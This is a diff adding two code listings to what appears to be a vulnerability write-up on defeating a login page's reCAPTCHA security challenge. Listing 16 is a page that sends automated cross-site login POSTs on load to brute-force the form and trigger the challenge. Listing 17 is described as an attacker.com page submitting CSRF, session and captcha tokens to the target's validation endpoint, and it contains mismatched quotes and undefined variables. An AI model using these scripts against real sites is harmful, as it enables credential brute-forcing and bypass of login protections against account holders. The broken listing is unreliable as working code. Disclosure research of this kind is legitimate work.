@@ -258,5 +258,49 @@ At URL _http://vuln-web.com/auth/createchallenge/anything/v3/recaptchav3.js_
     	}
     </script>
 
+### Listing 16 - Brute forcing the login form to trigger the security challenge
 
+    <script>
+    function sendAuthenticationRequest() {
+        var xhr = new XMLHttpRequest();
+        var url = 'https://vulnerable-web.com/login';
+        var params = 'email=r@gmail.com&password=1234567890&submit=True';
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                console.log('Response:', xhr.responseText);
+            }
+        };
+        xhr.send(params);
+    }
+	window.onload = function() {
+	    		for (var i = 0; i < 5; i++) {
+	        	setTimeout(sendAuthenticationRequest, i * 1000);
+					//1 Authentication request is sent each second.
+	    	}
+	};
+	</script>
+	<form action="https://vulnerable-web.com/login" method="POST">
+	<label for="email">Email:</label>
+	   <input type="email" id="email" name="email" required><br><br>
+	   <label for="password">Password:</label>
+	   <input type="password" id="password" name="password" required><br><br>
+	   <input type="submit" value="Login">
+	</form>
 
+### Listing 17 - attacker.com completing the security challenge
+	<script> 
+	function complete_security_challenge() {
+		var xhr = new XMLHttpRequest();
+		var url = 'https://vulnerable-web.com/auth/validatecaptcha';
+		var params = '_csrf=' + csrf + '&_sessionID=' + sessID + '&recaptcha=’ + recap + ‘&jse=' + jse;
+		xhr.open('POST', url, true);
+		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+		xhr.onreadystatechange = function() {
+		if (xhr.readyState === 4 && xhr.status === 200) {
+			console.log('Response:', xhr.responseText);
+			}
+		};
+		xhr.send(params);
+		}</script>
